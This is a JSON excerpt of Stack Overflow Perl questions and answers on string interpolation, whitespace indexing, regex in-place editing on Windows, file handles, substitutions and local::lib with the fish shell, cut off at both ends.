"@mahesh I don&#39;t know. Please ask a new question for that. If you can&#39;t do that yet, you will need wait until the ban is lifted. See <a href=\"https://meta.stackexchange.com/a/86998/202151\">meta.stackexchange.com/a/86998/202151</a> for details about that. In the meantime, I believe accepting this answer would be a good start, if you feel it helped you. (I hate coercing people to accept my answers, this is just a suggestion)."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 0, "last_activity_date": 1496654912, "last_edit_date": 1496654912, "creation_date": 1496500590, "answer_id": 44345033, "question_id": 44344939, "link": "https://stackoverflow.com/questions/44344939/how-can-i-interpolate-a-variable-from-a-command-line-argument-into-a-string/44345033#44345033", "title": "How can I interpolate a variable from a command line argument into a string?", "body": "<p>You are using single quotes <code>''</code> in your <code>chdir</code> command. Single quotes do not do variable interpolation in Perl. That means that <code>'/var/tmp/dst_$application/...'</code> means <code>/var/tmp/dst_$application/...</code>, and not <code>/var/tmp/dst_foo/...</code>.</p>\n\n<p>You need to use double quotes <code>\"\"</code> to interpolate variables in strings.</p>\n\n<pre><code>chdir \"/var/tmp/dst_$application/$version/$location\";\n</code></pre>\n\n<p>This will create <code>/var/tmp/dst_foo/...</code> instead.</p>\n\n<p>If you need to separate a variable from the rest of the string, use this notation. </p>\n\n<pre><code>print \"${foo}bar\";\n</code></pre>\n\n<p>This is different from <code>\"$foobar\"</code> because Perl thinks the whole <code>$foobar</code> is the variable name.</p>\n"}], "owner": {"reputation": 31, "user_id": 8104407, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f4a10c1591e69fe6d10a6f16b89b3c8a?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/8104407/mahesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "accepted_answer_id": 44345033, "answer_count": 1, "score": -4, "last_activity_date": 1496655503, "creation_date": 1496500005, "last_edit_date": 1496655503, "question_id": 44344939, "link": "https://stackoverflow.com/questions/44344939/how-can-i-interpolate-a-variable-from-a-command-line-argument-into-a-string", "title": "How can I interpolate a variable from a command line argument into a string?", "body": "<p>My program takes a command line argument which I would like to use to change the working directory of my Perl script.</p>\n\n<pre><code>use strict; \nuse warnings;\nuse Getopt::Std; \nuse Cwd 'chir';\n\nmy %opts=(); \ngetopts('a:v:l:', \\%opts); \nmy $application = $opts{a}; \nmy $version = $opts{v}; \nmy $location = $opts{l}; \n\nprint \"$application, $version, $location\\n\"; \n\nif($application eq 'abc') {\n    #print \"you came here\\n\"; \n    chdir \"/viewstore/ccwww/dst_${application}_${version}/abc/${location}\";\n    print $ENV{PWD}; \n    print \"you came here\\n\"; \n}\n</code></pre>\n\n<p>I've previously tried with <code>chdir '/var/tmp/dst_$application/$version/$location';</code>, but that did not work either.</p>\n\n<p>The current version of the code gives this warning.</p>\n\n<blockquote>\n  <p>Global symbol \"$application_\" requires explicit package name at ./test.pl line 20. Execution of ./test.pl aborted due to compilation errors.</p>\n</blockquote>\n\n<p>Line 20 is the one with <code>chdir</code>.</p>\n"}, {"tags": ["perl", "substring"], "comments": [{"owner": {"reputation": 13757, "user_id": 1270003, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/d5ed9123b92a6e4dffa75f9f6dd9e382?s=128&d=identicon&r=PG&f=1", "display_name": "texasbruce", "link": "https://stackoverflow.com/users/1270003/texasbruce"}, "edited": false, "score": 1, "creation_date": 1496443630, "post_id": 44338394, "comment_id": 75680673, "body": "I am curious - how are you able to find the index of &quot;/&quot; but not a space?"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1593600777, "last_edit_date": 1593600777, "creation_date": 1496444041, "answer_id": 44338460, "question_id": 44338394, "link": "https://stackoverflow.com/questions/44338394/finding-index-of-white-space-in-perl/44338460#44338460", "title": "Finding index of white space in Perl", "body": "<p>Just use <a href=\"http://p3rl.org/index\" rel=\"nofollow noreferrer\">index</a>:</p>\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nmy $string = 'stuff/more stuffhere';\nmy $index_of_slash = index $string, '/';\nmy $index_of_space = index $string, ' ';\n\nsay &quot;Between $index_of_slash and $index_of_space.&quot;;\n</code></pre>\n<p>The output is</p>\n<pre><code>Between 5 and 10.\n</code></pre>\n<p>Which is correct:</p>\n<pre><code>0         1\n01234567890123456789\nstuff/more stuffhere\n</code></pre>\n<p>If by &quot;whitespace&quot; you also mean tabs or whatever, you can use a regular expression match and the special variables <a href=\"https://p3rl.org/perlvar#@-\" rel=\"nofollow noreferrer\">@-</a> and <a href=\"https://p3rl.org/perlvar#@+\" rel=\"nofollow noreferrer\">@+</a>:</p>\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nmy $string = &quot;stuff/more\\tstuffhere&quot;;\n\nif ($string =~ m{/.*(?=\\s)}) {\n    say &quot;Between $-[0] and $+[0]&quot;;\n}\n</code></pre>\n<p>The <code>(?=\\s)</code> means <em>is followed by a whitespace character</em>, but the character itself is not part of the match, so you don't need to do any maths on the returned values.</p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 0, "last_activity_date": 1496447206, "last_edit_date": 1496447206, "creation_date": 1496446524, "answer_id": 44338769, "question_id": 44338394, "link": "https://stackoverflow.com/questions/44338394/finding-index-of-white-space-in-perl/44338769#44338769", "title": "Finding index of white space in Perl", "body": "<p>The arrays <code>@-</code> (<code>@LAST_MATCH_START</code>) and <code>@+</code> (<code>@LAST_MATCH_END</code>) give offsets of the start and end of last successful submatches.  See <a href=\"http://perldoc.perl.org/perlvar.html#Variables-related-to-regular-expressions\" rel=\"nofollow noreferrer\">Regex related variables in perlvar</a>.</p>\n\n<p>You can capture your real target, and then read off the offset right <em>after</em> it with <a href=\"http://perldoc.perl.org/perlvar.html#@+\" rel=\"nofollow noreferrer\"><code>$+[0]</code></a></p>\n\n<blockquote>\n  <p><strong>@+</strong><br>\n  This array holds the offsets of the ends of the last successful submatches in the currently active dynamic scope. <code>$+[0]</code> is the offset into the string of the end of the entire match. This is the same value as what the <code>pos</code> function returns when called on the variable that was matched against.</p>\n</blockquote>\n\n<p>Example</p>\n\n<pre><code>my $str = 'target and target with spaces';\n\nwhile ($str =~ /(target)\\s/g)\n{\n    say \"Position after match: $+[0]\"\n} \n</code></pre>\n\n<p>prints</p>\n\n<pre>\nPosition after match: 7\nPosition after match: 18\n</pre>\n\n<p>These are positions right after <code>'target'</code>, so of spaces that come after it.</p>\n\n<p>Or you can capture <code>\\s</code> instead and use <code>$-[1] + 1</code> (first position of the match, the space).</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1496453959, "creation_date": 1496453959, "answer_id": 44339442, "question_id": 44338394, "link": "https://stackoverflow.com/questions/44338394/finding-index-of-white-space-in-perl/44339442#44339442", "title": "Finding index of white space in Perl", "body": "<p>You can use </p>\n\n<pre><code>my $str = \"stuff/more stuffhere\";\nif ($str =~ m{/\\K\\S+}) {\n   ... substr($str, $-[0], $+[0] - $-[0]) ...\n}\n</code></pre>\n\n<p>But why <code>substr</code>? That's very weird there. Maybe if you told us what you actually wanted to do, we could provide a better alternatives. Here are three cases:</p>\n\n<p>Data extraction:</p>\n\n<pre><code>my $str = \"stuff/more stuffhere\";\nif ( my ($word) = $str =~ m{/(\\S+)} ) {\n   say $word;  # more\n}\n</code></pre>\n\n<p>Data replacement:</p>\n\n<pre><code>my $str = \"stuff/more stuffhere\";\n$str =~ s{/\\K\\S+}{REPLACED};\nsay $str;  # stuff/REPLACED stuffhere\n</code></pre>\n\n<p>Data replacement (dynamic):</p>\n\n<pre><code>my $str = \"stuff/more stuffhere\";\n$str =~ s{/\\K(\\S+)}{ uc($1) }e;\nsay $str;  # stuff/MORE stuffhere\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 24167, "user_id": 7388477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e42e688ade97076d4fdd1939946e7c7b?s=128&d=identicon&r=PG&f=1", "display_name": "Valdi_Bo", "link": "https://stackoverflow.com/users/7388477/valdi-bo"}, "is_accepted": false, "score": 1, "last_activity_date": 1496463927, "creation_date": 1496463927, "answer_id": 44340240, "question_id": 44338394, "link": "https://stackoverflow.com/questions/44338394/finding-index-of-white-space-in-perl/44340240#44340240", "title": "Finding index of white space in Perl", "body": "<p>As you stated, you want to <strong>select the word</strong> between the first <code>/</code>\nand the first space following it.\nIf this is the case, you maybe don't need any index (you need just\n<strong>the word</strong>).</p>\n\n<p>A perfect tool to find something in a text is <em>regex</em>.\nLook at the following code:</p>\n\n<pre><code>$txt = 'stuff/more stuffxx here';\nif ($txt =~ /\\/(.+?) /) {\n  print \"Match: $1.\\n\";\n}\n</code></pre>\n\n<p>The regex used tries to match:</p>\n\n<ul>\n<li>a slash,</li>\n<li>a non-empty sequence of any chars (note <code>?</code> - <strong>reluctant</strong>\nversion), enclosed in a capturing group,</li>\n<li>a space.</li>\n</ul>\n\n<p>So after the match <code>$1</code> contains what was captured by the first\ncapturing group, i.e. \"your\" word.</p>\n\n<p>But if for any reason you were interested in starting and ending\noffsets to this word, you can read them from <code>$-[1]</code>\nand <code>$+[1]</code> (starting / ending indices of the first capturing group).</p>\n"}], "owner": {"reputation": 41, "user_id": 7551975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/41c43528f1d8edad2b7ce3f99b401ae1?s=128&d=identicon&r=PG&f=1", "display_name": "benzeneAlanine", "link": "https://stackoverflow.com/users/7551975/benzenealanine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1130, "favorite_count": 0, "answer_count": 4, "score": 2, "last_activity_date": 1593600777, "creation_date": 1496443511, "question_id": 44338394, "link": "https://stackoverflow.com/questions/44338394/finding-index-of-white-space-in-perl", "title": "Finding index of white space in Perl", "body": "<p>I'm trying to find the index of white space in a string in Perl.</p>\n\n<p>For example, if I have the string </p>\n\n<pre><code>stuff/more stuffhere\n</code></pre>\n\n<p>I'd like to select the word \"more\" with a substring method.  I can find the index of \"/\" but haven't figured out how to find the index of white space.  The length of the substring I'm trying to select will vary, so I can't hard code the index.  There will only be one white space in the string (other than those after the end of the string).  </p>\n\n<p>Also, if anybody has any better ideas of how to do this, I'd appreciate hearing them.  I'm fairly new to programming so I'm open to advice.  Thanks.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 4191, "user_id": 1466640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0630f2d5ac5fb844675c58d3d2dfa57?s=128&d=identicon&r=PG&f=1", "display_name": "AKHolland", "link": "https://stackoverflow.com/users/1466640/akholland"}, "edited": false, "score": 0, "creation_date": 1496438639, "post_id": 44337354, "comment_id": 75679190, "body": "Just because there aren&#39;t <code>\\r</code>&#39;s in the document, doesn&#39;t mean it&#39;s not an <code>\\r\\n</code> issue."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1496440529, "post_id": 44337354, "comment_id": 75679805, "body": "You say &quot;it doesn&#39;t work&quot;, but what <i>does</i> happen?"}], "answers": [{"comments": [{"owner": {"reputation": 154069, "user_id": 260127, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/74758c702067a3490094451e475e28c5?s=128&d=identicon&r=PG", "display_name": "prosseek", "link": "https://stackoverflow.com/users/260127/prosseek"}, "edited": false, "score": 0, "creation_date": 1496442338, "post_id": 44338018, "comment_id": 75680335, "body": "It was the double quote issue. I didn&#39;t have the backup issue."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496464082, "post_id": 44338018, "comment_id": 75683897, "body": "Re &quot;<i>I didn&#39;t have the backup issue</i>&quot;, Then you aren&#39;t using Windows. Maybe you&#39;re using cygwin build of Perl?"}], "tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": true, "score": 1, "last_activity_date": 1496440885, "creation_date": 1496440885, "answer_id": 44338018, "question_id": 44337354, "link": "https://stackoverflow.com/questions/44337354/multi-line-regular-expression-issue-in-perl-on-windows-10/44338018#44338018", "title": "Multi-line regular expression issue in Perl on Windows 10.", "body": "<p>When I run the same command (after changing single quotes to double quotes), I get the following error message:</p>\n\n<blockquote>\n  <p>Can't do inplace edit without backup.</p>\n</blockquote>\n\n<p>This is documented in <a href=\"http://perldoc.perl.org/perldiag.html\" rel=\"nofollow noreferrer\">perldiag</a>:</p>\n\n<blockquote>\n  <p>You're on a system such as MS-DOS that gets confused if you try\n  reading from a deleted (but still opened) file. You have to say <code>-i.bak</code>, or some such.</p>\n</blockquote>\n\n<p>When I change the command to <code>perl -i.bak ...</code>, it works.</p>\n"}], "owner": {"reputation": 154069, "user_id": 260127, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/74758c702067a3490094451e475e28c5?s=128&d=identicon&r=PG", "display_name": "prosseek", "link": "https://stackoverflow.com/users/260127/prosseek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "accepted_answer_id": 44338018, "answer_count": 1, "score": 0, "last_activity_date": 1496440885, "creation_date": 1496437140, "question_id": 44337354, "link": "https://stackoverflow.com/questions/44337354/multi-line-regular-expression-issue-in-perl-on-windows-10", "title": "Multi-line regular expression issue in Perl on Windows 10.", "body": "<p>I'm trying to convert this pattern in files</p>\n\n<pre><code>Insert 18333fig0101.png\nFigure 1-1. Local version control diagram.\n</code></pre>\n\n<p>to </p>\n\n<pre><code>![Figure 1-1. Local version control diagram.](../figures/18333fig0101-tn.png)\n</code></pre>\n\n<p>This is the perl command: </p>\n\n<pre><code>perl -i -0pe 's/^Insert\\s*(.*)\\.png\\s*\\n([^\\n]*)$/!\\[\\2](..\\/figures\\/\\1-tn.png)/mg' */*.markdown\n</code></pre>\n\n<p>This works fine on Mac OS X, but it doesn't work on Windows 10.\nI installed perl using <code>pacman -S perl</code> from <code>MSYS2</code>. </p>\n\n<p>This is also not a <code>\\r\\n</code> issue as I checked there is no <code>\\r</code> in the document. </p>\n\n<p>Is this a known issue on Windows? Or, is there something different option needed for Windows? </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496429208, "post_id": 44334219, "comment_id": 75674999, "body": "<code>charset=iso-8859-1</code>? What is this, 1998?"}, {"owner": {"reputation": 946, "user_id": 1765406, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/Koqta.jpg?s=128&g=1", "display_name": "vanHoesel", "link": "https://stackoverflow.com/users/1765406/vanhoesel"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496439792, "post_id": 44334219, "comment_id": 75679571, "body": "@melpomene, please do not start on charsets, it&#39;s a swamp. And I rather see it specified then blindly trusting that it would be UTF-8... which is not specified either as a pragma at the top describing the encoding used in the Perl file, neither is the encoding specified at input to output ... maybe it is Latin-1 indeed ?"}], "answers": [{"tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 1, "last_activity_date": 1496445031, "last_edit_date": 1496445031, "creation_date": 1496425707, "answer_id": 44334731, "question_id": 44334219, "link": "https://stackoverflow.com/questions/44334219/read-and-write-a-textfile-with-perl/44334731#44334731", "title": "Read and write a textfile with Perl", "body": "<p><strong>Problem in your script</strong></p>\n\n<p>You are storing incorrect handler in your array that is your problem. <code>@datei = &lt;in&gt;</code> it should be</p>\n\n<pre><code>@datei = &lt;FHIN&gt;;\n</code></pre>\n\n<hr>\n\n<p><strong>Some etc things you should know</strong></p>\n\n<p>1) Always put use warnings and use strict on a top of the program.</p>\n\n<p>2) Don't store the whole file in an array instead you have to process the file line by line. </p>\n\n<pre><code>while (my $line = &lt;FHIN&gt;) \n{ \n  Do your stuff here. \n</code></pre>\n\n<p>3) use three arguments for file handle. Like as follow</p>\n\n<pre><code>open my $fh,'&lt;', \"filename\"\n</code></pre>\n\n<p>4) to access the each element from an array\u200b you can use Perl foreach instead of C style looping</p>\n\n<pre><code>for my $elemnts(@arrray)\n{\n</code></pre>\n\n<p>If you have suppose want to iterate loop through its index use the following format.</p>\n\n<pre><code>for my $index(0..$#arrray)\n{\n</code></pre>\n\n<p>Above <code>..</code> means range operator<code>$#</code> will give the last index value</p>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1496439613, "creation_date": 1496439613, "answer_id": 44337797, "question_id": 44334219, "link": "https://stackoverflow.com/questions/44334219/read-and-write-a-textfile-with-perl/44337797#44337797", "title": "Read and write a textfile with Perl", "body": "<p>If you had enabled <a href=\"https://metacpan.org/pod/warnings\" rel=\"nofollow noreferrer\">warnings</a> via <code>use warnings</code> or <code>use warnings qw(all)</code>&mdash;<em>which you should always do</em>&mdash;you would have seen something like this:</p>\n\n<blockquote>\n  <p><code>Name \"main::in\" used only once: possible typo at foo.pl line 6.</code></p>\n</blockquote>\n\n<p>That is, of course, this line:</p>\n\n<pre><code>@datei= &lt;in&gt;; \n</code></pre>\n\n<p>The root cause of the problem is that you opened a filehandle named <code>FHIN</code>, but you tried to read from a filehandle named <code>in</code>. However, the whole operation would be better written using lexical filehandles and the three-argument form of <code>open</code>, which is considered a <a href=\"https://stackoverflow.com/questions/1479741/why-is-three-argument-open-calls-with-autovivified-filehandles-a-perl-best-pract\">best practice</a>:</p>\n\n<pre><code>open(my $fh, '&lt;', 'HSS_D.txt') or die \"couldn't open file $!\"; \n</code></pre>\n\n<p>As an aside, I've voted to close this question as off-topic because it is about a problem that was caused by a simple typographical error.</p>\n"}], "owner": {"reputation": 59, "user_id": 7947168, "user_type": "registered", "accept_rate": 14, "profile_image": "https://graph.facebook.com/1627994043885013/picture?type=large", "display_name": "LittleEntertainer", "link": "https://stackoverflow.com/users/7947168/littleentertainer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1496445031, "creation_date": 1496423613, "last_edit_date": 1496426542, "question_id": 44334219, "link": "https://stackoverflow.com/questions/44334219/read-and-write-a-textfile-with-perl", "title": "Read and write a textfile with Perl", "body": "<p>I am trying to open and read a textfile and then write the content of this file line per line into an HTML-File. So far, I've come up with this:</p>\n\n<pre><code>use strict;     \nuse locale; \n\nmy (@datei, $i);\nopen (FHIN,\"HSS_D.txt\") || die \"couldn't open file $!\"; \n@datei= &lt;in&gt;; \nclose FHIN;\n\nopen (FHOUT, \"&gt;pz2.html\");\nprint FHOUT \"&lt;HTML&gt;\\n\"; \nprint FHOUT \"&lt;HEAD&gt;\\n\"; \nprint FHOUT \"&lt;TITLE&gt;pz 2&lt;/TITLE&gt;\\n\"; \nprint FHOUT '&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"&gt;'; \nprint FHOUT \"\\n&lt;/HEAD&gt;\\n\"; \nprint FHOUT \"&lt;BODY&gt;\\n\";\n\nfor ($i = 0; $i &lt; @datei; $i++) {\n    print FHOUT \"&lt;p&gt;$datei[$i]&lt;/p&gt;\\n\"; \n}\n\nprint FHOUT \"&lt;/BODY&gt;&lt;/html&gt;\\n\";\nclose (FHOUT);\n</code></pre>\n\n<p>However, I get a compilation error every time and I can't figure out what's wrong. Thanks for your help! </p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 7, "last_activity_date": 1496421677, "last_edit_date": 1496421677, "creation_date": 1496421575, "answer_id": 44333722, "question_id": 44333570, "link": "https://stackoverflow.com/questions/44333570/several-substitutions-in-perl/44333722#44333722", "title": "Several substitutions in perl", "body": "<p>As requested:</p>\n\n<pre><code>(my $newName = $grib) =~ s/:00:00.grb//; rename $grib, $newName; (my $newName1 = $newName)  =~ s/d01/d02/g; rename $newName, $newName1;\n</code></pre>\n\n<p>But that's dumb. There's also no reason to stuff everything in one line. Instead, work on producing quality readable code. For starters, stop renaming twice when once would do!</p>\n\n<pre><code>my $newName = $grib;\n$newName =~ s/:00:00.grb//;\n$newName =~ s/d01/d02/g;\nrename($grib, $newName)\n   or die(\"Can't rename \\\"$grib\\\" to \\\"$newName\\\": $!\\n\");\n</code></pre>\n\n<p>With 5.14+, this can be reduced to the following:</p>\n\n<pre><code>my $newName = $grib =~ s/:00:00.grb//r =~ s/d01/d02/gr;\nrename($grib, $newName)\n   or die(\"Can't rename \\\"$grib\\\" to \\\"$newName\\\": $!\\n\");\n</code></pre>\n"}], "owner": {"reputation": 997, "user_id": 2354319, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f1ea1af443d922b09df749e51b4b0436?s=128&d=identicon&r=PG", "display_name": "Enric Agud Pique", "link": "https://stackoverflow.com/users/2354319/enric-agud-pique"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 44333722, "answer_count": 1, "score": 0, "last_activity_date": 1496421677, "creation_date": 1496420959, "question_id": 44333570, "link": "https://stackoverflow.com/questions/44333570/several-substitutions-in-perl", "title": "Several substitutions in perl", "body": "<p>How can I do two replacements with Perl?   </p>\n\n<p>I use the following code. I use twice s to replace...I would like all in less lines...             </p>\n\n<pre><code>        (my $newName = $grib) =~ s/:00:00.grb//;\n        rename $grib, $newName;\n\n        (my $newName1 = $newName)  =~ s/d01/d02/g;\n        rename $newName, $newName1;\n</code></pre>\n"}, {"tags": ["perl", "shell", "fish"], "answers": [{"comments": [{"owner": {"reputation": 428, "user_id": 291892, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/Cyf65.jpg?s=128&g=1", "display_name": "Jon Lorusso", "link": "https://stackoverflow.com/users/291892/jon-lorusso"}, "edited": false, "score": 0, "creation_date": 1600088010, "post_id": 44328826, "comment_id": 112968726, "body": "This doesn&#39;t work. I get:  <code>~&#47;.config&#47;fish&#47;config.fish (line 1): Unsupported use of &#39;=&#39;. In fish, please use &#39;set PATH &quot;&#47;Users&#47;user1&#47;perl5&#47;bin${PATH:+:${PATH}}&quot;&#39;.</code>"}], "tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": true, "score": 3, "last_activity_date": 1496406013, "creation_date": 1496406013, "answer_id": 44328826, "question_id": 44327816, "link": "https://stackoverflow.com/questions/44327816/how-do-i-use-locallib-with-fish-shell/44328826#44328826", "title": "How do I use local::lib with fish shell?", "body": "<p>Just remove <code>$</code> and double quotes in <code>\"$()\"</code>,</p>\n\n<pre><code>eval (perl -I$HOME/perl5/lib/perl5 -Mlocal::lib)\n</code></pre>\n"}], "owner": {"reputation": 153, "user_id": 6108127, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/76ca6172de6585a757aea65b83e96092?s=128&d=identicon&r=PG&f=1", "display_name": "mikejw", "link": "https://stackoverflow.com/users/6108127/mikejw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 153, "favorite_count": 0, "accepted_answer_id": 44328826, "answer_count": 1, "score": 2, "last_activity_date": 1496406013, "creation_date": 1496402924, "question_id": 44327816, "link": "https://stackoverflow.com/questions/44327816/how-do-i-use-locallib-with-fish-shell", "title": "How do I use local::lib with fish shell?", "body": "<p>I'm still quite new to fish shell but this is really important for making me want to stay using it.</p>\n\n<p>If I try and activate local::lib with a normal bash style command:</p>\n\n<pre><code>eval \"$(perl -I$HOME/perl5/lib/perl5 -Mlocal::lib)\"\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>$(...) is not supported. In fish, please use '(perl)'.\nfish: eval \"$(perl -I$HOME/perl5/lib/perl5 -Mlocal::lib)\"\n</code></pre>\n"}, {"tags": ["xml", "perl", "iterator"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1496402291, "post_id": 44327584, "comment_id": 75659296, "body": "please Format your code properbly"}], "answers": [{"comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1496403017, "post_id": 44327656, "comment_id": 75659790, "body": "Or use signle quotes for attribute values, XPath accepts both."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1496405835, "post_id": 44327656, "comment_id": 75661579, "body": "Backslashing quotes is ugly and rarely needed in Perl. As @choroba points out, using single quotes for the attribute works fine here. But another (even more flexible) option is to use the <code>qq[...]</code> operator for the outer double-quotes - <code>$doc-&gt;findnodes(qq[&#47;&#47;networking&#47;interfaces[\\@config:type=\\&quot;l&zwnj;&#8203;ist\\&quot;]&#47;interface[$it&zwnj;&#8203;erator]&#47;device])</code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496414548, "post_id": 44327656, "comment_id": 75667093, "body": "... but you&#39;ve still escaped the quotes ;)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496647628, "post_id": 44327656, "comment_id": 75728935, "body": "<code>$doc-&gt;findnodes(qq[&#47;&#47;networking&#47;interfaces[\\@config:type=&quot;l\u200c&zwnj;&#8203;\u200bist&quot;]&#47;interface[$it&zwnj;&#8203;\u200c\u200berator]&#47;device])</code>"}], 